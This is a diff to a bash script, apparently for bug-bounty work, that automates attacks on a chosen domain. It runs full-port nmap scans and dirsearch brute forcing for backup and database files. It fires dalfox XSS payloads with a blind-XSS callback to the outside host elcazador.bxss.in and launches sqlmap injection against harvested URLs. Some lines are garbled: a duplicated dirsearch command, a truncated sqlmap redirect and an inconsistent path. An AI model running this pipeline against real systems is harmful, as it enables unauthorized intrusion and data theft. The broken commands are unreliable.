@@ -56,11 +56,11 @@ cat ~/Projects/$domain/sorted_subdomain.txt | httpx | anew ~/Projects/$domain/li
 
 echo -e "\n NMap Scanning in Progress"
 
-nmap -sV -iL ~/Projects/$domain/allsubdomains.txt -oN ~/Projects/$domain/scanned-port.txt --script=vuln
+nmap -sV -p- -iL ~/Projects/$domain/allsubdomains.txt -oN ~/Projects/$domain/scanned-port.txt
 
 echo -e "\n Doing a complete directory Brute Force"
 
-python3 ~/Tools/dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json python3 ~/Tools/dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -l ~/Projects/$domain/sorted_subdomain.txt
+python3 ~/Tools/dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json python3 ~/Tools/dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -l ~/Projects/$domain/sorted_subdomain.txt | tee ~/Projects/$domain/dir_search_result.txt 
 
 
 echo -e "\n Getting all URLS using waybackurls"
@@ -79,7 +79,11 @@ cat ~/Projects/$domain/sorted_subdomain.txt | xargs -I % python3 ~/Tools/ParamSp
 
 echo -e "\n Place All Parameter URLS into parameter_urls.txt and Live_parameter_urls.txt"
 
-cat ~/Projects/$domain/Parameters/* | tee  ~/Projects/$domain/param_urls.txt
+cat ~/Projects/$domain/Parameters/http:/* | tee  ~/Projects/$domain/param_urls.txt
+
+cat ~/Projects/$domain/Parameters/https:/* | anew  ~/Projects/$domain/param_urls.txt
+
+#cat ~/Projects/$domain/Parameters/* | tee  ~/Projects/$domain/param_urls.txt
 
 cat ~/Projects/$domain/param_urls.txt | sort -u | tee ~/Projects/$domain/unique_param_urls.txt
 
@@ -111,11 +115,11 @@ cat ~/Projects/$domain/sorted_subdomain.txt | httpx | python3  /root/Tools/smugg
 
 echo -e "\n Checking for XSS"
 
-cat ~/Projects/$domain/All_Urls.txt |httpx| kxss | sed 's/=.*/=/' | sed 's/^.*http/http/' | dalfox pipe -b  https://elcazador.bxss.in | tee ~/Project/$domain/xss_output.txt
+cat ~/Projects/$domain/All_Urls.txt | dnsx | uro | dalfox pipe -b  https://elcazador.bxss.in | tee ~/Project/$domain/xss_output.txt
 
 echo -e "\n Checking for SQLI"
 
-gf sqli ~/Projects/$domain/All_Urls.txt >> sqli.txt ; sqlmap -m ~/Projects/$domain/sqli.txt --dbs --banner --batch --risk 3 --level 3
+cat ~/Projects/$domain/All_Urls.txt | dnsx | uro | grep "\?" | head -20 |httpx -silent > ~/Projects/$domain/sqli;sqlmap -m ~/Projects/$domain/sqli --batch >
 
 echo -e "\n Checking Nuclei Results"
 
